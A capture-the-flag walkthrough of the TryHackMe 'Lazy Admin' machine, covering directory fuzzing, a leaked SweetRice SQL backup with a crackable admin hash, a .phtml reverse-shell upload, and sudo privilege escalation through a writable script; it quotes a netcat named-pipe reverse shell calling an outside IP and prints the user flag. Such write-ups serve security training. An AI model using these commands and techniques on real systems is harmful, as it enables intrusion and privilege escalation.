# Lazy Admin
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* SQL file
* Web Admin Console
* Upload Reverse Shell
* Sudoers

Tools used
--
* nmap
* ffuf

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.58.133
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.58.133 -p- -T5 -vvv

<SNIP>
Initiating SYN Stealth Scan at 00:56
Scanning 10.10.58.133 [65535 ports]
Discovered open port 80/tcp on 10.10.58.133
Discovered open port 22/tcp on 10.10.58.133
<SNIP>
```
Let's ffuf:
```
ffuf -u http://10.10.58.133/FFUF -H 'Host: 10.10.58.133' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.
5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/p
ayloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

content                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 44ms]
```
By visiting the found path, we and in a website. Let's ffuf it too:
```
ffuf -u http://10.10.58.133/content/FFUF -H 'Host: 10.10.58.133' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.
5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/p
ayloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 240ms]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 240ms]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 396ms]
as                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 238ms]
_themes                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 242ms]
attachment              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 80ms]
```
If we visit `inc`, we can see a file called `mysql_bakup_20191129023059-1.5.1.sql`. Usually `.sql` files contain a set of SQL commands. If we read its content by `code`, we can see a part with the following string:
```
<SNIP>
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
<SNIP>
```
So we have a `s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";`. That password is hashed. If we use CrackStation for cracking it, we get `Password123`. Furthermore `manager` is the related username. We can use this information for accessing to the login page at `as` page.

We get access to an admin dashboard. If we move to Settings -> General pane, we can get the following information:
```
Database : mysql
Database Host : localhost
Database Port : 3306
Database Account : rice
Database Password : randompass
```
There are several footholds for uploading files. After some checks, we noted that uploading a `.php` file by Media Center tab but this kind of file are not uploaded to `attachment` web path. We tried to use a reverse shell with a `.phtml` extension and we have been able to run it.

So, on the reverse shell, we executed:
```
$ script /dev/null -c bash

cat /home/itguy/user.txt
```
Then:
```
cat /home/itguy/backup.pl

#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
Then:
```
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
Then:
```
ls -la /home/itguy/backup.pl

-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl

sudo -l

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
Then:
```
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```
It means we can edit this file and insert any commands we like. And this script can be also run as sudo. Let's add this command to `copy.sh`. We cannot use `nano` and `vim`. But we can use a redirection:
```
echo "cp -rf /root/root.txt /home/itguy/" > /etc/copy.sh
```
Now run `/usr/bin/perl /home/itguy/backup.pl` as sudo and we should get `root.txt` in the `itguy` home folder.


cat user.txt: THM{63e5bce9271952aad1113b6f1ac28a07}